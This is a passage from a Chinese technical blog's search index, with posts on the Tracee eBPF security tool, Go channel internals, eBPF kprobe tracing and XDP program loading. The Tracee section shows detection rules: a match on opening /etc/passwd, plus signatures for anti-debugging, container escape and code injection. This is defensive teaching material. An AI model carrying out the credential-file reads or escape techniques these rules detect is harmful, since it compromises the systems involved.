Stuff\"tags:- \"linux\"eventSelectors:- source:traceename:openatexpression:|-input.eventName == 'openat' \u0026\u0026 input.stringArg('pathname').startsWith('/etc/passwd') 目前，Tracee 内置的 rules 可以通过 tracee-rules --list 命令查看，这里截取其中的一部分， ID NAME VERSION DESCRIPTION TRC-2 Anti-Debugging 0.1.0 Process uses anti-debugging technique to block debugger TRC-14 CGroups Release Agent File Modification 0.1.0 An Attempt to modify CGroups release agent file was detected. CGroups are a Linux kernel feature which can change a process's resource limitations. Adversaries may use this feature for container escaping. TRC-3 Code injection 0.1.0 Possible code injection into another process TRC-11 Container Device Mount Detected 0.1.0 Container device filesystem mount detected. A mount of a host device filesystem can be exploited by adversaries to perform container escape. TRC-9 New Executable Was Dropped During Runtime 0.1.0 An Executable file was dropped in your system during runtime. Usually container images are built with all binaries needed inside, a dropped binary may indicate an adversary infiltrated into your container 可以看到，tracee-rules 检测引擎的工作本质是对语义化安全策略与源事件信息进行匹配，若事件在上下文语义中携带有策略所指定的信息，便会产生告警，拿上面提到的 Anti-Debugging Signature 为例，其具体的策略信息如下所示， tracee_selected_events[eventSelector] { eventSelector := { \"source\": \"tracee\", \"name\": \"ptrace\", } } tracee_match { input.eventName == \"ptrace\" arg := input.args[_] arg.name == \"request\" arg.value == \"PTRACE_TRACEME\" } 其中 eventSelector 指定了我们关心的事件名称，这本质上就是一个过滤器，与在 tracee-ebpf 中指定 --trace event=ptrace 相差不大，在 tracee_match 中指定了策略所关心的相关 ptrace 系统调用入参的信息，其中指定了 request 参数值为 PTRACE_TRACEME 的 ptrace 调用。若在事件流中出现了满足上述策略定义的事件，tracee-rules 便会产生告警。 ptrace 手册 ptrace 的函数签名如下所示， long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 其中与 request 入参对应值 PTRACE_TRACEME 的相关释义为， PTRACE_TRACEME Indicate that this process is to be traced by its parent. A process probably shouldn't make this request if its parent isn't expecting to trace it. (pid, addr, and data are ignored.) The PTRACE_TRACEME request is used only by the tracee; the remaining requests are used only by the tracer. In the following requests, pid specifies the thread ID of the tracee to be acted on. For requests other than PTRACE_ATTACH, PTRACE_SEIZE, PTRACE_INTERRUPT, and PTRACE_KILL, the tracee must be stopped. 更多的信息可以参考手册。 ","date":"2022-09-05","objectID":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/:0:5","tags":["eBPF","OpenSource Project","Security Issues"],"title":"Tracee 漫游指北","uri":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/"},{"categories":null,"content":"总结 Tracee 项目由两大基本组件构成：1） tracee-ebpf 负责加载 eBPF 探针程序到 Linux 内核之中，采集发生在内核层面的安全事件，并将收集到的收集到的原始信息加以聚合整理，形成具有安全上下文语义的事件流，可供事件分析引擎进行监测。2） tracee-rules 是运行时安全检测引擎，目前其仅支持 tracee-ebpf 数据源。通过内置或用户自定义的 Signatures（rules），tracee-rules 在事件流中匹配相关的规则上下文，对成功匹配到的事件进行用户侧告警。 目前，Tracee 项目并不支持对违背安全策略的事件进行实时阻断拦截，社区中也有相关对于增加阻断拦截功能的相关讨论，团队成员目前也有增加相关支持的计划，主要将会使用到 LSM-BPF 去实现阻断拦截的功能需求。不过，要想使用 LSM-BPF 需要使用版本较新的 Linux 内核（5.7+），并且该功能模块并不是 Linux 内核的默认配置，需要用户在编译阶段指定相应的选项去进行内核配置，并且在启动阶段设置相关的 flags。 这些都是用户使用 LSM-BPF 的成本。 设计思考 除了实时阻断这一种设计方向外，我们若能够容忍异常行为的执行（这时候信息资产可能已经受到了损害），采取一种事后补救的措施也是可供思考的设计方向之一。 比如，对进行异常行为的外部实体进行封禁，拒绝其后续的行为，并对其操作进行回溯，找出具有安全风险的入口点，恢复其作出的更改，对相关入口采取应急措施。若出现文件落盘行为，则对相关文件进行进一步的沙盒分析，找出相关的回连地址，后续的操作可以有非常多的选择，可以设置蜜罐继续诱捕攻击者，又或是简单的将外联行为禁止等等。 Tracee 项目还未发布其正式版本（v1.0.0），还有许多功能特性以及 Bug 需要进行修复，多平台/架构的支持工作仍在继续，其设计思路以及编码风格可以为初学者提供比较清晰易懂的切入点。 ","date":"2022-09-05","objectID":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/:0:6","tags":["eBPF","OpenSource Project","Security Issues"],"title":"Tracee 漫游指北","uri":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/"},{"categories":null,"content":"大白话讲 Golang Channel 实现 本文尝试以轻松的口吻介绍 Golang 中 Channel 的相关实现，我们会以源码不断迭代发展的视角去观察 Channel 实现的变化，具体的来说，通过 Go 主仓库 Commit 历史记录来查看每一次改动所对应的 Issues，一同来看下 Go 开发团队的具体考量。除此之外，我们也需要抓住一些不变的本质，这些本质的实现是整个 Channel 实现设计的基础，考察相关的数据结构以及方法对我们理解具体编码时 Channel 的行为颇有裨益。 本文是笔者在学习过程中写成的，参考了许多前人写就的文章以及见解，为了让本文与其它介绍 Go Channel 相关实现的技术文章形成差异，我将以一种轻松非完全技术的口吻来介绍相关的实现，尽量减轻自身与读者进行二次理解时的认知负担。 本文摘要 本文将从介绍 Golang 的并发哲学开始，讲述 Go 对于并发编程具有“魅力”的设计实现，这为程序员提供了一种十分轻量及低认知负担地进行并发编程的方式，使得程序员能从关心如线程调度、线程使用开销、内存同步访问控制等底层问题中解放出来，来将更多的时间花费到解决更具体地业务问题上。 接着我们将会从四个个方面去考察 Channel 的设计实现， 创建一个 Channel 向 Channel 中发送数据 从 Channel 中取出数据 关闭 Channel 胡思乱想 创建一个 Channel 解决的是一个对象有无的问题，向 Channel 中传入数据与取出数据是 Channel 的功能性实现，而关闭 Channel 则是有始有终，是对有限资源的回收。 最后，我们会沿着历史的视角，观察 Channel 实现的版本迭代以及其背后的考量。 值得一提的是，源码中 Channel 主要逻辑实现的位置：runtime package chan.go Golang 并发哲学 Go 语言中最令人津津乐道的特性无外乎是对并发的天然支持了。使用过 Go 进行并发编程的同学们一定能够体会到使用 go 关键字创建协程并通过 chan 进行跨协程通信的魅力。goroutine 轻量化的特性让我们能够无心理负担地使用 go 关键字轻松创建上万个协程的同时仍能保持一个较高的性能，使用 chan 进行跨协程间通信有助于轻松实现生产者-消费者模型，充分利用现代机器并行计算的能力。同时，尽量避免通过使用共享内存的方式来进行跨协程之间的通信。Golang 对此还有一句广为人知的格言， Do not communicate by sharing memory; instead, share memory by communicating. 而这一切都是 Golang 语言对 CSP (Communicating Sequential Process) 模型的诠释。1978 年 C.A.R Hoare 发表在 ACM 的一篇论文中指出一门编程语言应该重视 input 和 output，尤其是注重并发编程。Go 吸收了论文中有益的设计以及观点，并将其中的并发编程哲学内化到整个语言的设计当中，进一步将 CSP 发扬光大。Go 也并没有抛弃传统的内存同步访问控制，因其仍然存在许多的使用场景，在 Go 中也有相应的 sync 包提供支持。 Goroutine 与 Channel 相互搭配解决了并发编程中棘手的问题，程序员无需再关心与线程调度、共享内存同步访问控制、线程使用开销等底层问题，他们仅需要关心具体的业务逻辑，充分发挥自己的想象力利用 Go 的能力去解决现实世界中的问题。 浅谈 goroutine 与 channel goroutine 可以理解为一种粒度更细的线程，它由 Go 运行时维护，负责它的创建、调度、销毁全生命周期过程。它扮演了并发编程中工作者的角色，维护了在其管理域下代码执行的上下文环境，提供了轻量化的资源集合，拥有更小的上下文切换开销，是 Go 中实现高性能并发编程的基础对象。 Channel 则解决了 goroutine 之间数据传递的问题。利用 Channel 我们可以实现以下但不限于这些应用：（1）停止信号；（2）定时任务；（3）解耦生产方和消费方；（4）控制并发数； 完成一项具体的工作需要不同部门的通力配合，每一个阶段都有相应的投入与产出，某一阶段可能是是单一重复劳动，增加工人的数量能够显著提高效率，使用流水线的作业方式能够执行同一生产过程的不同阶段，也能够提高最终的生产效率。goroutine 好比完成任务的工人，Channel 则是贯通不同部门的货物传输管道，两者相互配合最终实现 CPU 时间片的高效利用。 1️⃣ 创建一个 Channel 在 Go 中，我们通常使用以下代码创建一个 Channel， myChan := make(chan Foo) // Channel without buffer myChanWithBuf := make(chan Foo, 10) // Channel with buffer 上述两行代码分别创建了两种不同类型的 Channel，一种是不带有缓冲区的 Channel，一种是带有缓冲区的 Channel，它们分别对应于上述代码段的 1-2 行。 这是使用 Go 语言在语用层面对 Channel 进行定义，在 Go 编译器进行编译的类型检查阶段中，会根据代表 make 关键字的 OMAKE 节点参数类型的不同来转换成三种不同类型的节点（回想我们使用 make 关键字创建切片、哈希表以及这里的 Channel），分别是：OMAKESLICE，OMAKEMAP，OMAKECHAN，最后调用不同的运行时函数来创建相应节点的数据结构。 我们这里主要介绍创建 Channel 时，运行时主要的执行逻辑，makechan。不过，在介绍 makechan 的具体实现之前，我们得先来看一看运行时中 chan 所对应的底层数据结构，hchan，它的结构如下代码段所示， type hchan struct { qcount uint // total data in the queue dataqsiz uint // size of the circular queue buf unsafe.Pointer // points to an array of dataqsiz elements elemsize uint16 closed uint32 elemtype *_type // element type sendx uint // send index recvx uint // receive index recvq waitq // list of recv waiters sendq waitq // list of send waiters // lock protects all fields in hchan, as well as several // fields in sudogs blocked on this channel. // // Do not change another G's status while holding this lock // (in particular, do not ready a G), as this can deadlock // with stack shrinking. lock mutex } 这里我们逐一介绍每一个字段的具体作用， qcount 指的是当前循环队列中的元素个数 dataqsiz 指的是循环队列的最大长度，也就是在创建 chan 时通过 make 关键字传入的第二个参数 buf 是一个指向底层实现循环队列数组的指针 elemsize 指的是创建 chan 时给定 chan 中数据类型的大小（比如 int 为 4 个字节，在这里便是 4） closed 是一个标志位，用于指示当前 chan 是否处于关闭状态，当 chan 关闭时，其值为 1 elemtype 指的是 chan 中的数据类型 sendx 指的是循环队列中待发送元素的下标 recvx 指的是循环队列中待接收元素应该存放位置的下标 recvq 是一个双向循环链表，其中存放的是等待接收数据的 goroutine。 sendq 是一个双向循环链表，其中存放的是等待发送数据的 goroutine。 lock 是一个互斥锁，用于保护上述字段以及 sudog 结构体中的字段在进入临界区时的读写。 我们在这里再多花一点时间来看一看 recvq 和 sendq，它们对应的数据类型是 waitq 如下代码片段所示， type waitq struct { first *sudog last *sudog } waitq 结构体中有两个指向 sudog 结构体的指针，其中 first 指向链表中的首个元素，last 指向链表中的最后一个元素。当链表为空时，first 与 last 都为 nil。其中 sudog 是这样的一个结构体， // sudog represents a g in a wait list, such as for sending/receiving // on a channel. // // sudog is necessary because the g ↔ synchronization object relation // is many-to-many. A g can be on many wait lists, so there may be // many sud","date":"2022-08-28","objectID":"/2022-07-18-%E5%A4%A7%E7%99%BD%E8%AF%9D%E8%AE%B2gochannel%E5%AE%9E%E7%8E%B0/:0:1","tags":["golang"],"title":"大白话讲 Golang Channel 实现","uri":"/2022-07-18-%E5%A4%A7%E7%99%BD%E8%AF%9D%E8%AE%B2gochannel%E5%AE%9E%E7%8E%B0/"},{"categories":null,"content":"eBPF 程序的跟踪能力 The ability to attach eBPF programs to trace points as well as kernel and user application probe points allows unprecedented visibility into the runtime behavior of applications and the system itself. By giving introspection abilities to both the application and system side, both views can be combined, allowing powerful and unique insights to troubleshoot system performance problems. Advanced statistical data structures allow to extract meaningful visibility data in an efficient manner, without requiring the export of vast amounts of sampling data as typically done by similar systems. ","date":"2022-07-24","objectID":"/2022-07-25-ebpf-tracing/:0:1","tags":["eBPF","tracing","tutorial"],"title":"eBPF-tracing 使用 eBPF 编写监控类程序","uri":"/2022-07-25-ebpf-tracing/"},{"categories":null,"content":"如何找到你所需要的追踪点？ 首先，我们需要明确自身的需求，考虑清楚我们需要获取哪一些数据信息，再从这些数据信息的类型出发找到其对应的追踪位置。在 eBPF 程序中有以下这几种常用的追踪点类型： kprobe 内核探针 uprobe 用户程序探针 tracepoint 内核静态跟踪点 raw_tracepoint 原始跟踪点 知道了有哪些种类的跟踪点还不够，我们还需要根据自身的需求找到对应类型具体的跟踪点对象。 kprobe 对于 krpobe 类型内核探针来说，我们可以使用 bpftrace 工具查看支持的所有内核探针，我们只需要在 CLI 终端中键入 bpftrace -l \"kprobe:*\" 便可以查看所有支持的内核探针。 kprobe:zswap_free_entry kprobe:zswap_frontswap_init kprobe:zswap_frontswap_invalidate_area kprobe:zswap_frontswap_invalidate_page kprobe:zswap_frontswap_load kprobe:zswap_frontswap_store 对于每一个内核探针来说，它都将被挂载在对应的内核函数之上，当该内核函数被调用后便会触发我们 Hook 在其之上的 eBPF 处理函数。如 zswap_free_entry 函数，在 https://elixir.bootlin.com/ 中，我们可以找到对应版本的 Linux kernel 查看相关内核函数的函数签名和实现，zswap_free_entry 函数的实现如下所示， /* * Carries out the common pattern of freeing and entry's zpool allocation, * freeing the entry itself, and decrementing the number of stored pages. */ static void zswap_free_entry(struct zswap_entry *entry) { if (!entry-\u003elength) atomic_dec(\u0026zswap_same_filled_pages); else { zpool_free(entry-\u003epool-\u003ezpool, entry-\u003ehandle); zswap_pool_put(entry-\u003epool); } zswap_entry_cache_free(entry); atomic_dec(\u0026zswap_stored_pages); zswap_update_total_size(); } 我们到这先停止以下，看看我们目前为止都做了哪一些工作：1）确定自身进行系统监控的需求；（2）根据需求找到需要进行跟踪的对象（在这里便是我们具体的 kprobe）；3）了解相关 kprobe 挂载的内核函数签名，更进一步可以明确函数的调用链，将其与具体的事件相关联。 想到的话就得说 😀 事件是触发一系列操作的因。 比如，我们使用 cat foo.txt 命令将 foo.txt 文件的内容输出至标准输出流中时就涉及到了操作系统的一系列操作（执行 /usr/bin/cat 二进制文件，内存申请与分配，打开文件，读写文件等），期间操作系统执行系统调用，由用户态陷入内核态，进而在内核空间中执行相关的逻辑。利用操作系统的能力为上层应用提供对应的服务，让应用无需关心复杂的资源分配与调度问题（CPU、内存、I/O）。 不过，了解内核函数何时被调用、被谁调用是一个较高的要求，它需要你对操作系统、对内核实现十分熟悉，对于非内核开发者来说无疑十分苦恼。 不过有了 eBPF 程序，我们可以通过函数调用栈找到上层的 caller，进而观察被 Hook 函数调用的全过程，实现对触发事件的溯源。通过在敏感函数上 Hook eBPF 程序，我们可以发现并记录系统中发生的异常行为，从而为事后的分析溯源以及拦截阻断提供充足的决断依据。 接下来，我们就需要着手开始 eBPF 程序的编写了，我们先来看看一个 eBPF 程序的基本元素。 SEC Macro: SEC 宏展开后用于创建 ELF Section ，帮助 BPF 加载器找到对应元素的位置，比如像 libbpf 库就可以通过 ELF 文件中相应的 Section 来找到并加载对应的 eBPF 程序。 LICENSE: eBPF 程序的授权许可证，通常使用 GPL 许可。 对于 kprobe 类型的 eBPF 程序（BPF_PROG_TYPE_KPROBE）来说，通常以 SEC(kprobe/kernel_function_name) 方式使用，比如 SEC(kprobe/zswap_free_entry) 。在其它类型的 eBPF 程序上也大同小异，通常为 SEC(bpf_prog_type/instance_name) ，例如 tracepoint 类型的 eBPF 程序使用 SEC(tracepoint/tracepoint_name) 对 eBPF 函数进行声明。 上述工作都做完后，我们就正式进入到 eBPF 程序的编写过程了，在编写 eBPF 程序时我们要确定对于 eBPF 程序类型函数的入参。在 kprobe 类型的 eBPF 函数中，我见到了十分多对传入指针不同的类型解释，我们都一起来看看各项目实现都是如何使用的， 在 tracee 中使用了 libbpf 库提供的 BPF_KPROBE Macro 去定义它们的 kprobe 类型 eBPF 程序，该宏定义如下所示， /* * BPF_KPROBE serves the same purpose for kprobes as BPF_PROG for * tp_btf/fentry/fexit BPF programs. It hides the underlying platform-specific * low-level way of getting kprobe input arguments from struct pt_regs, and * provides a familiar typed and named function arguments syntax and * semantics of accessing kprobe input paremeters. * * Original struct pt_regs* context is preserved as 'ctx' argument. This might * be necessary when using BPF helpers like bpf_perf_event_output(). */ #define BPF_KPROBE(name, args...) \\ name(struct pt_regs *ctx); \\ static __attribute__((always_inline)) typeof(name(0)) \\ ____##name(struct pt_regs *ctx, ##args); \\ typeof(name(0)) name(struct pt_regs *ctx) \\ { \\ _Pragma(\"GCC diagnostic push\") \\ _Pragma(\"GCC diagnostic ignored \\\"-Wint-conversion\\\"\") \\ return ____##name(___bpf_kprobe_args(args)); \\ _Pragma(\"GCC diagnostic pop\") \\ } \\ static __attribute__((always_inline)) typeof(name(0)) \\ ____##name(struct pt_regs *ctx, ##args) 通过注释以及宏定义我们可以看到，该宏的用途主要是消除了不同平台从 struct *pt_regs 中读取数据的差异，具体的入参还是 struct *pt_regs ，当然也可以通过 args 指定其它的参数。 通过 struct *pt_regs 我们能够获得调用被 Hook 函数时寄存器的状态，并能够获取其中的数据。对于不同的硬件平台，使用 BPF_KPROBE 宏能为我们抹除平台差异，让程序员能够以最熟悉的方式编写 eBPF 程序，struct *pt_regs 的定义如下所示， struct pt_regs { long unsigned int r15; long unsigned int r14; long unsigned int r13; long unsigned int r12; long unsigned int bp; long unsigned int bx; long unsigned int r11; long unsigned int r10; long unsigned int r9; long unsigned int r8; long unsigned int ax; long unsigned int cx; long unsigned int dx; long unsigned int si; long unsigned int di; long unsigned int orig_ax; long unsigned int ip; long unsigned int","date":"2022-07-24","objectID":"/2022-07-25-ebpf-tracing/:0:2","tags":["eBPF","tracing","tutorial"],"title":"eBPF-tracing 使用 eBPF 编写监控类程序","uri":"/2022-07-25-ebpf-tracing/"},{"categories":null,"content":"XDP-Tutorial ⭐ 本文章仍然在不断的更新中，因此文章结构以及内容可能会时常发生变化。同时本领域也是作者刚刚涉及的领域，难免在文本内容中出现错误，还望指正，大家一同学习共勉。 XDP-Tutorial 是一个 Github 上的 repo，皆在指导人们如何遵循最基本的步骤，高效地实现为内核中的 XDP 系统进行编程。我会随着这个课程的步伐与大家一同探寻 Linux 内核世界的奥秘以及如何使用高性能的 XDP 程序对网络数据报进行处理。随着学习的深入，我会列出理解每一节课程的编程实现所需要前置知识，查漏补缺，帮助我们大家更好地理解其中的知识脉络，为以后单独开发相关的系统提供思路支撑。 ","date":"2022-07-18","objectID":"/2022-07-18-xdp-tutorial/:1:0","tags":["eBPF","XDP","tutorial"],"title":"XDP-tutorial 学习如何编写 eBPF XDP 程序","uri":"/2022-07-18-xdp-tutorial/"},{"categories":null,"content":"XDP (eXpress Data Path) 简介 XDP 是 Linux 内核上游（Linux 内核原始版本非 Linux 分发版）的一部分，它为用户提供了将用户编写的包处理程序安装进入内核的通道，安装进入内核的包处理程序会在系统接收到包（还未对数据包进行任何处理）的时候触发执行，从而提供了一种高性能的方式允许用户自定义处理内核接收到数据包时的行为。 XDP 与内核协议栈的整合\" XDP 与内核协议栈的整合 ","date":"2022-07-18","objectID":"/2022-07-18-xdp-tutorial/:1:1","tags":["eBPF","XDP","tutorial"],"title":"XDP-tutorial 学习如何编写 eBPF XDP 程序","uri":"/2022-07-18-xdp-tutorial/"},{"categories":null,"content":"XDP 程序操作模式种类 原生模式 (Native XDP) 卸载模式 (Offloaded XDP) 通用模式 (Generic XDP) Native XDP： ​ 该模式是默认模式。在这种模式下，XDP 的 BPF 程序 在网络驱动程序的早期接收路径之外直接运行。使用该模式需要硬件设备的支持。使用 git grep -l XDP_SETUP_PROG drivers 命令可以检查驱动程序是否支持此模式。 Offloaded XDP： ​ 在卸载模式下，XDP 的 BPF 程序直接卸载到网卡上，而不是在主机 CPU 上执行。因本就仅有相当低开销的 XDP 程序的执行从 CPU 上转移到网卡上，从而这种模式能够比原生 XDP 具有更高的性能。使用这种操作模式的 XDP 程序需要得到网卡的支持。使用 git grep -l XDP_SETUP_PROG_HW drivers 可以检查哪些网卡驱动程序支持 Offloaded 模式。 Generic XDP： ​ 对于没有提供 Offloaded 或 Native 模式支持的网卡设备来说，内核提供了一个使用 XDP 通用模式的选项。使用此模式不需要需要任何的驱动支持，因为其运行在一个相对于网络内核栈中相对靠后的位置。其存在主要的目的是为了开发人员在不支持上述两种模式的环境中进行 XDP 程序的开发与调试。在该模式下，XDP 程序的运行性能没有前两者那么高效，因此在生产环境中 ","date":"2022-07-18","objectID":"/2022-07-18-xdp-tutorial/:1:2","tags":["eBPF","XDP","tutorial"],"title":"XDP-tutorial 学习如何编写 eBPF XDP 程序","uri":"/2022-07-18-xdp-tutorial/"},{"categories":null,"content":"XDP 程序使用场景 缓解 DDoS 攻击，防火墙 利用 XDP BPF 的特性我们可以自行定义驱动丢弃恶意网络包的行为逻辑。通过在对数据包进行处理的早期阶段令数据包处理器向网络驱动抛出 XDP_DROP 丢弃恶意数据包，我们能够仅付出极小代价的情况下将数据包丢弃，维持系统资源处于一个健康可用的状态。另外，利用 XDP_TX XDP_PASS XDP_REDIRECT 我们还能够自定义逻辑对流量进行清洗、控制流量的走向，实现对主机的保护。 借助 XDP，我们可以在网卡或其驱动程序中以完全可编程的方式获得相同的功能，而这相比于昂贵的防火墙硬件设备来的非常便宜且快速。并且我们可以通过远程调用 API 更改规则来控制映射，然后将映射中的规则集动态传递给每台特定计算机中加载的 XDP 程序，这样就能够动态的控制集群中网络拓扑结构。 负载均衡 上面提到过数据包处理器可以通过向网络驱动抛出状态码影响网络驱动的对数据包的行为，在负载均衡的场景中，我们可以使用 XDP_TX 或者 XDP_REDIRECT ，将经过 XDP 程序处理后的数据包发往接收到该数据包的网卡或将其推至另外的网卡中传输。 直接将该数据包传入到一类特殊的套接字家族 (AF_XDP) 中 先于内核协议栈的包过滤/处理 在 Linux 内核协议栈正式处理抵达的数据包之前，XDP 程序可以根据用户自定义的策略对到达的数据包进行过滤，这可以通过 XDP_DROP 指示网络驱动丢弃掉不符合规则的数据包实现。 例如，当我们确定某一节点上运行的服务流量只有 TCP 流量时，我们可以使用 XDP 程序丢弃所有使用其它四层协议（UDP、SCTP）的流量。 我们也可以使用 XDP 程序去实现自有协议的封装与解封装，这对内核协议栈是透明的。不仅如此，我们还能够在接收到的数据包头部（非数据包区域）前增加一段元数据，这些元数据对于内核协议栈来说是透明的，但对于 TC 程序来说它可以获取到相关的元数据信息，从而控制其程序的行为逻辑，完成相关的数据包解析工作。 监控 使用 XDP 程序对到达的网络数据流进行特征统计与流量分析，也可以对数据包进行一些复杂的分析（比如恶意特征提取与检测）。XDP 与以往的一些技术解决方案相比具有以下优势：1）XDP 允许在较早的阶段对网络数据包进行介入，能够截断或是将数据包中的载荷提取出来并通过 Linux 内核提供的 perf 基础设施（快速、无锁、每一个 CPU 都具有的内存环形缓冲区域）推送至用户空间的应用程序中进行下一步处理，这种数据通路的处理性能比以往的解决方案要更加动态快速。 在云原生安全中，我们需要强调基础设施的可观测性，对于节点、容器、应用、服务等各层次等系统构成元素来说，我们需要监控其运行状态获取其性能指标，也需要对一个进入集群的请求进行追踪，对各组件产生的日记信息进行收集汇总，汇总各个维度的数据信息，为编排平台进行决策以及事件溯源提供充足的信息支撑。XDP 程序可以与其它组件以及数据源进行搭配组合，通过实时的监测指标以及运行状态数据统计，动态地改变集群内部的网络拓扑结构，最终实现服务集群的高可用。 ","date":"2022-07-18","objectID":"/2022-07-18-xdp-tutorial/:1:3","tags":["eBPF","XDP","tutorial"],"title":"XDP-tutorial 学习如何编写 eBPF XDP 程序","uri":"/2022-07-18-xdp-tutorial/"},{"categories":null,"content":"XDP Hook 使用 LLVM 对内核态的 XDP 程序进行编译后，我们可以使用两种方式将 ELF 文件中的 BPF 字节码加载进入内核并挂载至指定的网络设备当中。 编写 C 用户态程序，使用 BPF Loader 将编译后的 XDP ELF 文件加载进入内核之中 通过 iproute2 ip 挂载 （该方式所使用的 BPF Loader 并不是通过 Libbpf 库实现的，这意味着当我们开始使用 BPF Maps 的时候可能会出现不兼容的情况），下面将给出一段示例展示如何使用 ip 工具将编译后的 ELF 文件加载进入内核之中 # 向 lo 网络设备上以 xdpgeneric 方式挂载 xdp_pass_kern.o ELF 文件中 section 为 xdp 的字节码 ip link set dev lo xdpgeneric obj xdp_pass_kern.o sec xdp 有了挂载的方式我们还需要有查看和卸载 XDP 程序的方式，下面将介绍使用该工具进行查看和卸载的方式， # 展示 lo 网络设备的相关信息 ip link show dev lo # 方式 2 bpftool net list dev lo # 从 lo 网络设备中卸载以 xdpgeneric 方式挂载的 XDP 程序 ip link set dev lo xdpgeneric off Go 语言使用 libbpfgo 库加载 ELF 文件中的 XDP 程序字节码，这个方式是本人认为最优雅的方式 // 加载 eBPF 程序编译后的 ELF 文件 bpfModule, err := bpf.NewModuleFromFile(\"main.bpf.o\") if err != nil { fmt.Fprintln(os.Stderr, err) os.Exit(-1) } // 加载其中的 eBPF 对象 err = bpfModule.BPFLoadObject() if err != nil { fmt.Fprintln(os.Stderr, err) os.Exit(-1) } // 提取其中的内核态程序 \"target\" 是自编写的 XDP 程序函数名 xdpProg, err := bpfModule.GetProgram(\"target\") if xdpProg == nil { fmt.Fprintln(os.Stderr, err) os.Exit(-1) } // 指定需要挂载的网络设备 lo _, err = xdpProg.AttachXDP(\"lo\") if err != nil { fmt.Fprintln(os.Stderr, err) os.Exit(-1) } 在上述 Go 程序代码我们可以发现 bpfModule.GetProgram(\"target\") 指定了我们想要从 ELF 文件中加载的 eBPF 程序对象，这意味着我们可以在一个 ELF 文件可以包含多个 XDP 程序，我们可以从中选择我们所需要的进行加载。这种能力是 libbpfgo 封装 libbpf 得来的，而 libbpf 是通过封装系统调用得到的。 在 libbpf 中内部使用 struct bpf_object struct bpf_program struct bpf_map 三类结构体去管理和抽象 eBPF 程序，用户需要使用 libbpf 对外暴露的 API 接口去操作相关的数据结构。 XDP 程序操作模式种类：原生模式 (Native XDP) 卸载模式 (Offloaded XDP) 通用模式 (Generic XDP) Native XDP： ​ 该模式是默认模式。在这种模式下，XDP 的 BPF 程序 在网络驱动程序的早期接收路径之外直接运行。使用该模式需要硬件设备的支持。使用 git grep -l XDP_SETUP_PROG drivers 命令可以检查驱动程序是否支持此模式。 Offloaded XDP： ​ 在卸载模式下，XDP 的 BPF 程序直接卸载到网卡上，而不是在主机 CPU 上执行。因本就仅有相当低开销的 XDP 程序的执行从 CPU 上转移到网卡上，从而这种模式能够比原生 XDP 具有更高的性能。使用这种操作模式的 XDP 程序需要得到网卡的支持。使用 git grep -l XDP_SETUP_PROG_HW drivers 可以检查哪些网卡驱动程序支持 Offloaded 模式。 Generic XDP： ​ 对于没有提供 Offloaded 或 Native 模式支持的网卡设备来说，内核提供了一个使用 XDP 通用模式的选项。使用此模式不需要需要任何的驱动支持，因为其运行在一个相对于网络内核栈中相对靠后的位置。其存在主要的目的是为了开发人员在不支持上述两种模式的环境中进行 XDP 程序的开发与调试。在该模式下，XDP 程序的运行性能没有前两者那么高效，因此在生产环境中推荐使用前两种模式。 ","date":"2022-07-18","objectID":"/2022-07-18-xdp-tutorial/:1:4","tags":["eBPF","XDP","tutorial"],"title":"XDP-tutorial 学习如何编写 eBPF XDP 程序","uri":"/2022-07-18-xdp-tutorial/"},{"categories":null,"content":"XDP 程序的编写 Basic 03 - counting with BPF maps 我们可以通过定义一个全局结构体 bpf_map_def 并带上 SEC(\"maps\") 宏来创建一个 BPF map， struct { __uint(type, BPF_MAP_TYPE_ARRAY); __type(key, __u32); __type(value, struct datarec); __uint(max_entries, XDP_ACTION_MAX); } xdp_stats_map SEC(\".maps\"); struct { __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY); __type(key, __u32); __type(value, struct datarec); __uint(max_entries, MAX_ENTRIES); } xdp_stats_map_percpu SEC(\".maps\"); BPF Maps 创建 —— 代码示范 当你需要创建数量较多的 BPF Maps 时，你可以参考以下创建示例来简化你的代码逻辑， #define BPF_MAP(_name, _type, _key_type, _value_type, _max_entries) \\ struct { \\ __uint(type, _type); \\ __uint(max_entries, _max_entries); \\ __type(key, _key_type); \\ __type(value, _value_type); \\ } _name SEC(\".maps\"); #define BPF_HASH(_name, _key_type, _value_type, _max_entries) \\ BPF_MAP(_name, BPF_MAP_TYPE_HASH, _key_type, _value_type, _max_entries) #define BPF_LRU_HASH(_name, _key_type, _value_type, _max_entries) \\ BPF_MAP(_name, BPF_MAP_TYPE_LRU_HASH, _key_type, _value_type, _max_entries) BPF_HASH(kconfig_map, u32, u32, 10240); BPF_HASH(interpreter_map, u32, file_info_t, 10240); BPF_HASH(containers_map, u32, u8, 10240); 上述示例代码来自 tracee BPF maps 是通用的键值对存储方式，在上述定义中 __uint(type, BPF_MAP_TYPE_ARRAY) 用于指定特定类型的 BPF maps（这里给出了 v5.4 内核版本中所有的 BPF maps 类型），__type(key, __u32) 用于指定 Key 对应的数据类型，__type(value, struct datarec) 用于指定 Value 对应的数据类型，__uint(max_entries, XDP_ACTION_MAX) 用于指定可存放的最大元素个数。 使用 bpf_object_find_map_by_name() 函数可以通过 BPF maps 的名字找到其对应的 bpf_map 对象，通过 bpf_map_fd() 函数可以获得 map 的文件描述符，libbpf 库中提供了一个函数bpf_object__find_map_fd_by_name() 用于直接完成上述两个步骤。 eBPF Maps 特性 所有处于内核态的 BPF 程序以及用户空间中的应用程序都能够访问 BPF Maps。 在用户空间中，我们可以通过函数 bpf_map_lookup_elem() 在用户空间中读取 BPF Maps 中的内容。 在上述代码中，我们分别定义了两种不同类型的 BPF Maps，它们分别是 BPF_MAP_TYPE_ARRAY 与 BPF_MAP_TYPE_PERCPU_ ARRAY ，它们两者之间最大的区别 【对持有的数据对象进行操作是否需要加锁】 ，对于前者来说多个数据操作主体对一片共享内存空间进行操作，所以在这片内存空间之上进行操作时需要持有锁（操作需要是原子的），而对于后者来说，由于各数据操作主体独有一片自用的内存空间，便不存在了临界区，我们可以直接在这片区域上进行读写。不过，这时候我们在用户空间代码中的操作可能会有些许不同，这是由于数据被各 CPU 所持有，要想获取完整的数据需要遍历所有 CPU 持有的 Map 对象。注意到考虑硬件平台可能会支持 CPU 热插拔，所以 Linux Kernel 在初始化时会为这些潜在的可能能够上线的 CPU 初始化相应的 Buffer，分配相应的 CPU ID。若要查看当前环境中所有可能存在的 CPU 数量，可以在 root 